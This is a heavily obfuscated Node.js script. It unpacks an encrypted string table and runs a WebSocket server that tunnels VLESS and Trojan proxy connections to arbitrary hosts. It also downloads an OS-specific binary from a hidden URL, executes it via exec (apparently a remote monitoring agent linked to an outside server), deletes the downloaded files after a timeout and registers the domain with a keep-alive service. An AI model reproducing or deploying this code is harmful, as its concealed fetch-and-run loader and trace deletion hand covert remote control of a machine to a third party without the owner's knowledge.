(function(z){var U,k,d,o;function n(J,m){return J<<m}function g(J,m){return J>>m}function B(J,m){return J<=m}function A(J,m){return J%m}function y(J,m){return J*m}function T(J,m){return J+m}function P(J,m){return J-m}function a(J,m){return J/m}function E(J,m){return J<m}function H(J,m){return J>m}function O(J,m){return J>=m}function m(J,m,w){return J[m]=w,J}d=m;let h=(()=>['ct','object','d','_$a'])();(U=Object.assign)&&0||(o=JSON.parse);let b=['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'],F,w=String.fromCharCode,C=Uint8Array,u=Uint16Array,Y=Uint32Array;k=typeof window===T('obje',h[0])&&window||typeof self==='object'&&self||exports||typeof globalThis===T('obje',h[0])&&globalThis||typeof global===h[1]&&global;let J=(function(J){var b,Y,O,h,g;g=m;const U=g(g({},'O','hijklmnopqrstuvwxyz0123456789+/'),'v','atob');((((O=T('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg',U.O))||8)&&(b=function(O){var m,U,w;const J='charAt'.split('|');for(((m={})||true)&&(w=0)&&0||(U=O.length);E(w,U);w++)m[O[J[0]](w)]=w;return m}(O))||'0')&&(Y=function(U){var Y,O,m,h;const J=g(g(g(g(g(g(g(g(g(g({},'O',0),'v','charAt'),'Y',1),'b','char'),'A',2),'u',6),'d',3),'t',255),'K','length'),'r','');return(m=U.length)&&0||(Y=A(m,4),h=(H(m,0)?n(b[U[J.v](0)],18):J.O)|(H(m,J.Y)?n(b[U[T(J.b,'At')](J.Y)],12):J.O)|(H(m,J.A)?n(b[U.charAt(J.A)],J.u):J.O)|(H(m,3)?b[U.charAt(J.d)]:0),O=[w(h>>>16),w(h>>>8&255),w(h&J.t)],O[J.K]-=[0,0,J.A,1][Y],O.join(J.r))})&&null||(h=function(J){return J.replace(/\S{1,4}/g,Y)}))&&0||g(J,U.v,function(m){let J=''.split('|');return h(String(m).replace(/[^A-Za-z0-9\+\/]/g,J[0]))})}(k),function(z){var S,K,F,R,f,v,t,k,l,M,D,s,q,e,L,U,J,x,j,W,d,N,c,r,Q,b;x=m;let $=[8,'K','type','I','prototype','undefined',16,17,18,0,9,10,11,13,2,14,15,19,23,27,35,51,67,83,115,163,195,227,258,1,3,4,5,33,49,129,385,513,1025,1537,2049,3073,4097,8193,12289,6,7,12,288,'th',30,'d'];(((r=$[0])||'0')&&(e=!0)||9)&&(U=void 0);function Z(J){throw J}function X(w,Y){var U,g,b,J;b=m;const O='verify|N|fy|c|method|not|bufferSize|bufferType|resize'.split('|');J=this;(U=void 0,b(b(J,'input',w),'c',0),Y||!(Y={}))&&(Y[T('ind','ex')]&&(J.c=Y[T('ind','ex')])&&0||Y[O[0]]&&(J[O[1]]=Y[T('veri',O[2])]));((g=w[J[O[3]]++])||'0')&&(U=w[J[O[3]]++]);switch(g&15){case r:J[O[4]]=r}(0!==A(T(n(g,8),U),31)&&Z(Error(T('err:',A(T(n(g,8),U),31))))||'1')&&(U&32&&Z(Error(O[5])))&&0||b(J,'B',new V(w,b(b(b(b({},'index',J[O[3]]),O[6],Y[O[6]]),O[7],Y.bufferType),O[8],Y[O[8]])))}((R=(x(X.prototype,'p',function(){var g,J,w,U,b;g=m;let O=['input',0,'B','c','i32c'];return((J=this)&&0||(w=J[O[0]]))&&0||(b=void O[1],U=void 0,b=J[O[2]].p(),g(J,O[3],J.B[O[3]]),J.N&&(U=(n(w[J[O[3]]++],24)|n(w[J.c++],16)|n(w[J.c++],8)|w[J[O[3]]++])>>>O[1],U!==jb(b)&&Z(Error(O[4]))),b)}),0))||3)&&(j=1);function V(w,U){var J,O;O=m;const g='l|m|e|g|c|q|input|s|C|index|bufferType|resize|b|a|f|t|I|o|J'.split('|');J=this;(O(O(O(O(O(O(O(J,g[0],[]),g[1],32768),g[2],J[g[3]]=J[g[4]]=J[g[5]]=0),g[6],l?new C(w):w),g[7],!1),'n',j),g[8],!1),U||!(U={}))&&(((U[g[9]]&&(J.c=U[g[9]])&&0||U[T('buffer','Size')]&&(J[g[1]]=U.bufferSize))&&0||U[g[10]]&&(J.n=U[g[10]]))&&null||U[g[11]]&&(J.C=U[T('resi','ze')]));switch(J.n){case R:J[g[12]]=32768;J[g[13]]=new(l?C:Array)(T(T(32768,J[g[1]]),258));break;case j:J.b=0;J.a=new(l?C:Array)(J[g[1]]);J[g[14]]=J.K;J[g[15]]=J[g[16]];J[g[17]]=J[g[18]];break;default:Z(Error('imd'))}}((V[T('proto',$[2])][$[1]]=function(g){var J,B,U,b,w,m,O,h;let Y=x(x(x(x(x(x(x(x(x(x(x(x({},'O','length'),'v','inp'),'Y','ut'),'b',0),'A','input'),'u','v'),'d','number'),'t','G'),'K','leng'),'r','c'),'D','u'),'X',2);return(O=this)&&0||(w=T(a(O[T(Y.v,Y.Y)][Y.O],O.c),1)|Y.b,J=void 0,b=void Y.b,B=void Y.b,m=O[Y.A],U=O.a,g&&('number'===typeof g[Y.u]&&(w=g[Y.u]),Y.d===typeof g[Y.t]&&(w+=g.G)),H(2,w)?(J=a(P(m.length,O[Y.r]),O[Y.D][2]),B=y(258,a(J,Y.X))|0,b=E(B,U[Y.O])?T(U.length,B):n(U.length,1)):b=y(U[T(Y.K,'th')],w),l?(h=new C(b),h.set(U)):h=U,O.a=h)})&&0||(V[T('proto','type')][$[3]]=function(){var w,J,m;let O=(()=>['b','a','length',0])();return(J=this)&&0||(w=J[O[0]],l?J.C?(m=new C(w),m.set(J.a[T('subar','ray')](0,w))):m=J.a[T('subar','ray')](O[3],w):(H(J[O[1]].length,w)&&(J.a[O[2]]=w),m=J[O[1]]),J.buffer=m)}))&&0||(V[$[4]].J=function(g,u){var Y,w,U,k,o,n,C,a,h;n=m;function y(){return n(n(n(n(n(n(n(n({},'O','u'),'v',256),'Y','f'),'b','length'),'A',8),'u','e'),'d','c'),'t','b')}const z=y();for(((((C=this)||6)&&(U=C.a)||true)&&(k=C.b)&&0||n(C,z.O,g))&&0||(Y=U.length);256!==(o=i(C,g));)if(H(z.v,o)){(O(k,Y)&&(U=C[z.Y](),Y=U[z.b])||4)&&(U[k++]=o)}else{for(((((w=P(o,257))&&null||(h=b[w]))&&0||E(0,D[w])&&(h+=G(C,D[w]))||9)&&(o=i(C,u))&&0||(a=J[o])||3)&&(E(0,F[o])&&(a+=G(C,F[o])))&&null||H(T(k,h),Y)&&(U=C[z.Y](),Y=U[z.b]);h--;)U[k]=U[P(k++,a)]}for(;B(z.A,C.e);)C[z.u]-=8,C[z.d]--;n(C,z.t,k)});function h(U){var p,h,k,b,C,F,g,o,w,u,J,z,m;const O=(()=>[0,1])();((h=U.length)||1)&&(w=O[0])&&0||(k=Number.POSITIVE_INFINITY);for(z=0;E(z,h);++z)H(U[z],w)&&(w=U[z]),E(U[z],k)&&(k=U[z]);for(b=(g=n(1,w),o=new(l?Y:Array)(g),m=1,C=O[0],2);B(m,w);){for(z=0;E(z,h);++z)if(U[z]===m){for(p=(u=O[0],J=C,0);E(p,m);++p)u=n(u,O[1])|J&1,J>>=1;for(p=(F=n(m,16)|z,u);E(p,g);p+=b)o[p]=F;++C}(++m&&0||(C<<=O[1])||4)&&(b<<=1)}return[o,w,k]}function i(k,u){var F,J,U,Y,h,b,z,C,o,B;C=m;const w='inp|c|length|e'.split('|');for((((((b=k.g)&&0||(o=k.e))&&0||(U=k[T(w[0],'ut')]))&&0||(z=k[w[1]])||4)&&(J=U[w[2]])&&0||(h=u[0])||8)&&(F=u[1]);E(o,F)&&!O(z,J);)b|=n(U[z++],o),o+=8;return B=h[b&P(n(1,F),1)],Y=B>>>16,C(C(C(k,'g',g(b,Y)),w[3],P(o,Y)),'c',z),B&65535}function o(b){var w,g,U,F,B,J,u,O,o;o=m;let Y='th|o|call'.split('|');function k(B,b,U){var O,J,g,w,u,Y;Y=m;const h=(()=>Y(Y(Y(Y(Y(Y(Y({},'O','z'),'v',0),'Y',3),'b',2),'A',17),'u',7),'d',18))();((O=this)||1)&&(J=O[h.O]);for(w=h.v;E(w,B);)switch(g=i(O,b),g){case 16:for(u=T(h.Y,G(O,h.b));u--;)U[w++]=J;break;case h.A:for(u=T(3,G(O,3));u--;)U[w++]=h.v;J=0;break;case h.d:for(u=T(11,G(O,h.u));u--;)U[w++]=0;J=h.v;break;default:J=U[w++]=g}return Y(O,h.O,J),U}((((U=T(G(b,5),257))||4)&&(J=T(G(b,5),1))&&0||(B=T(G(b,4),4))||'0')&&(F=new(l?C:Array)(d[T('leng',Y[0])]))||true)&&(g=void 0)&&0||(u=void 0);for(O=0;E(O,B);++O)F[d[O]]=G(b,3);if(!l){for(B=(O=B,F.length);E(O,B);++O)F[d[O]]=0}((((w=h(F))||'1')&&(g=new(l?C:Array)(U))||5)&&(u=new(l?C:Array)(J))&&0||o(b,'z',0))&&0||b[Y[1]](h(k[Y[2]](b,U,w,g)),h(k[Y[2]](b,J,w,u)))}function G(b,u){var g,h,o,J,w,U,Y;h=m;const B=['g','input','length','bk',1,'e','c'];for((((((U=b[B[0]])||5)&&(J=b.e)||8)&&(Y=b[B[1]])||'0')&&(o=b.c)||4)&&(w=Y[B[2]]);E(J,u);)O(o,w)&&Z(Error(B[3])),U|=n(Y[o++],J),J+=8;return g=U&P(n(1,u),B[4]),h(h(h(b,'g',U>>>u),B[5],P(J,u)),B[6],o),g}((((((t=(V[T('proto','type')].p=function(){var Y,C,B,z,m,w,h,k,u,y,J;let g=(()=>'s|input|c|length|e|iL|iN|ih|ib|ray|b|th|f|subarray|a|e: |t'.split('|'))();for(h=this;!h[g[0]];){(((u=G(h,3))||5)&&(u&1&&(h.s=e))||1)&&(u>>>=1);switch(u){case 0:C=h[g[1]];Y=h[g[2]];J=h.a;k=h.b;y=C[g[3]];m=U;B=U;z=J[g[3]];w=U;h[g[4]]=h.g=0;O(T(Y,1),y)&&Z(Error(g[5]));m=C[Y++]|n(C[Y++],8);O(T(Y,1),y)&&Z(Error(g[6]));B=C[Y++]|n(C[Y++],8);m===~B&&Z(Error(g[7]));H(T(Y,m),C.length)&&Z(Error(g[8]));switch(h.n){case R:for(;H(T(k,m),J[T('leng','th')]);){if(w=P(z,k),m-=w,l){(J.set(C[T('subar',g[9])](Y,T(Y,w)),k)||2)&&(k+=w)&&0||(Y+=w)}else{for(;w--;)J[k++]=C[Y++]}(((h[g[10]]=k)||8)&&(J=h.f())||true)&&(k=h[g[10]])}break;case j:for(;H(T(k,m),J[T('leng',g[11])]);)J=h[g[12]](x({},'v',2));break;default:Z(Error('im'))}if(l){(J.set(C[g[13]](Y,T(Y,m)),k)||2)&&(k+=m)&&0||(Y+=m)}else{for(;m--;)J[k++]=C[Y++]}h.c=Y;h[g[10]]=k;h[g[14]]=J;break;case 1:h.o(c,W);break;case 2:o(h);break;default:Z(Error(T(g[15],u)))}}return I(h[g[16]]())},$[5]))&&0||(l=t!==typeof C&&t!==typeof u&&t!==typeof Y&&t!==typeof DataView)||3)&&(d=(q=[$[6],$[7],$[8],$[9],$[0],7,$[10],6,$[11],5,$[12],4,12,3,$[13],$[14],$[15],1,15],l?new u(q):q))||2)&&(b=(k=[3,4,5,6,7,8,$[10],$[11],$[12],13,$[16],17,$[17],$[18],$[19],31,$[20],43,$[21],59,$[22],$[23],99,$[24],131,$[25],$[26],$[27],$[28],258,258],l?new u(k):k))&&0||(D=(Q=[0,$[9],0,$[9],$[9],$[9],0,$[9],1,$[29],1,1,2,2,$[14],$[14],$[30],$[30],3,3,4,4,$[31],$[31],5,$[32],$[32],$[32],$[9],0,0],l?new C(Q):Q))||'1')&&(J=(S=[$[29],2,3,4,5,7,9,$[13],17,25,$[33],$[34],65,97,$[35],193,257,$[36],$[37],769,$[38],$[39],$[40],$[41],$[42],6145,$[43],$[44],16385,24577],l?new u(S):S))||6)&&(F=(s=[0,$[9],$[9],0,$[29],$[29],2,2,3,$[30],$[31],$[31],5,5,6,$[45],$[46],7,$[0],$[0],9,9,10,$[11],11,11,12,$[47],13,$[13]],l?new C(s):s))||2)&&(L=new(l?C:Array)($[48]));for(N=(N=void 0,v=$[9],L[T('leng',$[49])]);E(v,N);++v)L[v]=O(143,v)?8:O(255,v)?9:O(279,v)?$[46]:8;(c=h(L))&&null||(f=new(l?C:Array)($[50]));for(K=(K=void $[9],M=$[9],f[T('leng','th')]);E(M,K);++M)f[M]=5;W=h(f);function I(U){var m,J,b,Y,B,h;let O=[0,'',2,4,6,7,12,31,63,13,14];((Y=void O[0])&&0||(J=O[1])||'1')&&(Y=U.length)&&null||(m=0);while(E(m,Y)){h=U[m++];switch(g(h,4)){case O[0]:case 1:case O[2]:case 3:case O[3]:case 5:case O[4]:case O[5]:J+=w(h);break;case O[6]:case O[9]:B=U[m++];J+=w(n(h&O[7],O[4])|B&O[8]);break;case O[10]:B=U[m++];b=U[m++];J+=w(n(h&15,O[6])|n(B&O[8],6)|n(b&63,O[0]))}}return J}z[$[51]]=function(m){const J=(()=>['map','split'])();let w=new X(new C(z.atob(m)[J[1]]('')[J[0]](J=>J.charCodeAt(0))),{}),O=w.p();return O}}(k),F=typeof globalThis===h[1]&&globalThis||typeof window==='object'&&window||typeof self===T('obje',h[0])&&self||typeof global==='object'&&global,!0);for(let m of b)(m=k[h[2]](m),m=o(m),J)?U(F,m):((F[T('StringE','xtract')]=m)||5)&&U(F,m);for(let J=0;E(J,z.length);J++)F[T(h[3],J)]&&U(F,d({},F[T(h[3],J)],z[J]))}([parseInt,'WEi',console.log,console.error,46,encodeURIComponent,true,'PVQjxPyb']));const os=require(J7e),http=require(n7e),fs=require(F7e),axios=require(o7e),net=require(a7e),path=require(T7e),crypto=require(_7e),$vqv7pE=require(I7e),Buffer=$vqv7pE[i7e],$vczgLf=require(q7e),exec=$vczgLf[$7e],execSync=$vczgLf[S7e],$v1SQwk=require(Z7e),WebSocket=$v1SQwk[E7e],createWebSocketStream=$v1SQwk[L7e],UUID=process[f7e][m7e]||X7e,NEZHA_SERVER=process[f7e][G7e]||'',NEZHA_PORT=process[f7e][b7e]||'',NEZHA_KEY=process[f7e][A7e]||'',DOMAIN=process[f7e][C7e]||'',AUTO_ACCESS=process[f7e][s7e]||!0,WSPATH=process[f7e][Y7e]||UUID[g7e](r7e,k7e),SUB_PATH=process[f7e][y7e]||x7e,NAME=process[f7e][j7e]||O7e,PORT=process[f7e][t7e]||H7e;let ISP='';const GetISP=async()=>{try{const G=await axios.get(Kee),w=G[uee];ISP=(w[Ree]+kee+w[ree])[Wee](/ /g,'_')}catch(G){ISP=e7e}};GetISP();const httpServer=http[Hee]((w,G)=>{if(w[Nee]==='/'){const w=path[Fee](__dirname,oee);fs[aee](w,Tee,(w,x)=>{if(w){G[Pee](z7e,{[cee]:_ee}),G[hee](Iee);return}G[Pee](z7e,{[cee]:_ee}),G[hee](x)});return}else{if(w[Nee]===zee+SUB_PATH){const T=Qee+UUID+Mee+DOMAIN+pee+DOMAIN+dee+DOMAIN+Dee+WSPATH+Vee+NAME+kee+ISP,z=Uee+UUID+Mee+DOMAIN+vee+DOMAIN+dee+DOMAIN+Dee+WSPATH+Vee+NAME+kee+ISP,x=T+'\n'+z,w=Buffer[Jee](x)[wee](nee);G[Pee](z7e,{[cee]:Bee}),G[hee](w+'\n')}else{G[Pee](N7e,{[cee]:Bee}),G[hee](lee)}}}),wss=new WebSocket[iee]({[qee]:httpServer}),uuid=UUID[Wee](/-/g,''),DNS_SERVERS=[$ee,See];function resolveHost(G){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[Zee](G)){resolve(G);return}let x=r7e;function w(){if(x>=DNS_SERVERS[Eee]){reject(new Error(Lee+G+mee));return}const T=DNS_SERVERS[x];x++;const z=fee+K7e(G)+Xee;axios.get(z,{[Aee]:P7e,[Yee]:{[see]:Cee}})[bee](x=>{const G=x[uee];if(G[gee]===r7e&&G[yee]&&G[yee][Eee]>r7e){const w=G[yee][xee](G=>G[jee]===B7e);if(w){resolve(w[uee]);return}}w()})[Gee](G=>((w()),void 0))}w()})}function handleVlessConnection(g,G){var r=B7e,i=g7e;const [z]=G,E=G[i](r,c7e);if(!E[Oee]((G,w)=>G==u7e(uuid[tee](w*h7e,h7e),l7e))){return!1}let y=G[i](c7e,Q7e)[eee]()+M7e;const x=G[i](y,y+=h7e)[K$e](r7e),w=G[i](y,y+=r)[eee](),T=w==r?G[i](y,y+=d7e)[Fee]('.'):w==h7e?new TextDecoder()[r$e](G[i](y+r,y+=r+G[i](y,y+r)[eee]())):w==p7e?G[i](y,y+=l7e)[W$e]((x,w,z,G)=>z%h7e?x[R$e](G[g7e](z-B7e,z+B7e)):x,[])[u$e](G=>G[K$e](r7e)[wee](l7e))[Fee](':'):'';g[k$e](new Uint8Array([z,r7e]));const h=createWebSocketStream(g);resolveHost(T)[bee](w=>((net[N$e]({[z$e]:w,[P$e]:x},function(){this[B$e](G[g7e](y)),h[H$e](h$e,()=>{})[c$e](this)[H$e](h$e,()=>{})[c$e](h)})[H$e](h$e,()=>{})),void 0))[Gee](w=>((net[N$e]({[z$e]:T,[P$e]:x},function(){this[B$e](G[g7e](y)),h[H$e](h$e,()=>{})[c$e](this)[H$e](h$e,()=>{})[c$e](h)})[H$e](h$e,()=>{})),void 0));return!0}function handleTrojanConnection(x,G){var w=B7e,T=g7e;try{if(G[Eee]<D7e){return!1}const r=G[T](r7e,V7e)[wee](),z=[UUID];let y=null;for(const G of z){const w=crypto[M$e](p$e)[Q$e](G)[l$e](d$e);if(w===r){y=G;break}}if(!y){return!1}let offset=V7e;if(G[offset]===U7e&&G[offset+w]===v7e){offset+=h7e}const M=G[offset];if(M!==w){return!1}offset+=w;const h=G[offset];offset+=w;let E,i;if(h===w){E=G[T](offset,offset+d7e)[Fee]('.'),offset+=d7e}else{if(h===p7e){const x=G[offset];offset+=w,E=G[T](offset,offset+x)[wee](),offset+=x}else{if(h===d7e){E=G[T](offset,offset+l7e)[W$e]((x,w,z,G)=>z%h7e?x[R$e](G[g7e](z-B7e,z+B7e)):x,[])[u$e](G=>G[K$e](r7e)[wee](l7e))[Fee](':'),offset+=l7e}else{return!1}}}i=G[K$e](offset),offset+=h7e;if(offset<G[Eee]&&G[offset]===U7e&&G[offset+w]===v7e){offset+=h7e}const g=createWebSocketStream(x);resolveHost(E)[bee](w=>((net[N$e]({[z$e]:w,[P$e]:i},function(){if(offset<G[Eee]){this[B$e](G[g7e](offset))}g[H$e](h$e,()=>{})[c$e](this)[H$e](h$e,()=>{})[c$e](g)})[H$e](h$e,()=>{})),void 0))[Gee](w=>((net[N$e]({[z$e]:E,[P$e]:i},function(){if(offset<G[Eee]){this[B$e](G[g7e](offset))}g[H$e](h$e,()=>{})[c$e](this)[H$e](h$e,()=>{})[c$e](g)})[H$e](h$e,()=>{})),void 0));return!0}catch(z){return!1}}wss[H$e](D$e,(G,x)=>{const w=x[Nee]||'';G[V$e](U$e,w=>{if(w[Eee]>c7e&&w[r7e]===r7e){const x=w[g7e](B7e,c7e),z=x[Oee]((G,w)=>G==u7e(uuid[tee](w*h7e,h7e),l7e));if(z){if(!handleVlessConnection(G,w)){G[v$e]()}return}}if(!handleTrojanConnection(G,w)){G[v$e]()}})[H$e](h$e,()=>{})});const getDownloadUrl=()=>{const G=os[w$e]();return G===J$e||G===n$e||G===F$e?!NEZHA_PORT?_$e:T$e:!NEZHA_PORT?a$e:o$e},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const x=getDownloadUrl(),G=await axios({[I$e]:'get',[Nee]:x,[q$e]:i$e}),w=fs[$$e](S$e);G[uee][c$e](w);return new Promise((resolve,reject)=>((w[H$e](Z$e,()=>((W7e(E$e)),(exec(L$e,G=>{if(G){reject(G)}resolve()})),void 0))),(w[H$e](h$e,reject)),void 0))}catch(G){throw G}},runnz=async()=>{try{const status=execSync(m$e,{[X$e]:f$e});if(status[G$e]()!==''){W7e(b$e);return}}catch(w){}await downloadFile();let z='',G=[A$e,C$e,s$e,Y$e,g$e,y$e];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const w=G[j$e](NEZHA_PORT)?zGe:'';z=PGe+NEZHA_SERVER+BGe+NEZHA_PORT+cGe+NEZHA_KEY+hGe+w+lGe}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const x=NEZHA_SERVER[j$e](':')?NEZHA_SERVER[t$e](':')[O$e]():'',w=G[j$e](x)?KGe:e$e,z=uGe+NEZHA_KEY+WGe+NEZHA_SERVER+RGe+w+rGe+UUID;fs[kGe](HGe,z)}z=NGe}else{W7e(x$e);return}}try{exec(z,{[pGe]:MGe},G=>{if(G){R7e(DGe,G)}else{W7e(dGe)}})}catch(x){R7e(QGe+x)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const G=VGe+DOMAIN;try{const w=await axios[UGe](vGe,{[Nee]:G},{[Yee]:{[cee]:wGe}});W7e(JGe)}catch(w){}}const delFiles=()=>((fs[nGe](S$e,()=>{})),(fs[nGe](HGe,()=>{})),void 0);httpServer[FGe](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),w7e)),(addAccessTask()),(W7e(oGe+PORT)),void 0))
